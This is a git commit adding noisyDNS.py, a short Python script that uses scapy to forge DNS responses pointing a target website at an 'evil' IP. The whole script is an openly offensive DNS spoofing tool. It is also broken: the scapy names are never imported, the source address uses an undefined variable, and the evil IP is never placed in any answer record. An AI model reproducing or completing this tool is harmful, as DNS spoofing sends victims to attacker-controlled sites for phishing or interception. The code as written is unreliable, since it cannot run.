9ef72de997b24559b64a33c52f315e953e4df463
lab2112 <brandon.coates@gmail.com>
2014-10-29 01:25:33 -0400

    first commit

---
+++ noisyDNS.py
@@ -0,0 +1,19 @@
+import scapy
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument("targetsite",  help="the webiste that your are faking the DNS repsonse")
+parser.add_argument("evilIP", help="IP of evil website")
+parser.add_argument("dnsserver", help="spoofed DNS server")
+args = parser.parse_args()
+
+s = (args.evilIP)
+d = (args.dnsserver)
+
+dns_pkt=DNS(qr=1,rd=1,qd=DNSQR(qname=args.targetsite))
+udp_pkt=UDP()
+ip_pkt=IP(src=ls)
+
+pkt = ip_pkt/udp_pkt/dns_pkt
+
+send(pkt)
